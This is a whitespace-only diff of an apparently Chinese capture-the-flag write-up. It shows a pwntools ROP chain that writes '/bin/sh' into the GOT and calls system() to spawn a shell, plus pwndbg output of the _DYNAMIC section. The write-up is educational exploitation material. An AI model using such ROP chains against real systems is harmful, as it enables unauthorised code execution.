@@ -197,7 +197,7 @@ pop_rdi_ret = 0x400b39
 payload = flat(['a'*0x28, pop_r12_r13_ret, bin_sh, got_start, mov_r13_r12_ret])
 
 for i in range(8):
-	payload += flat([pop_r14_r15_ret, 2, got_start+i, xor_r15_r14b_ret])
+    payload += flat([pop_r14_r15_ret, 2, got_start+i, xor_r15_r14b_ret])
 
 payload += flat([pop_rdi_ret, got_start, elf.plt['system']])
 p.sendline(payload)
@@ -423,11 +423,11 @@ ret
 
 ```
 pwndbg> x/20x &_DYNAMIC
-0x600e20:	0x00000001	0x00000000	0x00000001	0x00000000
-0x600e30:	0x0000000c	0x00000000	0x00400560	0x00000000
-0x600e40:	0x0000000d	0x00000000	0x004008b4	0x00000000
-0x600e50:	0x00000019	0x00000000	0x00600e10	0x00000000
-0x600e60:	0x0000001b	0x00000000	0x00000008	0x00000000
+0x600e20:    0x00000001    0x00000000    0x00000001    0x00000000
+0x600e30:    0x0000000c    0x00000000    0x00400560    0x00000000
+0x600e40:    0x0000000d    0x00000000    0x004008b4    0x00000000
+0x600e50:    0x00000019    0x00000000    0x00600e10    0x00000000
+0x600e60:    0x0000001b    0x00000000    0x00000008    0x00000000
 ```
 
 可以看到在 `0x600e48` 的指针指向 `0x4008b4`，这就是我们要赋值给 `r12` 的值。
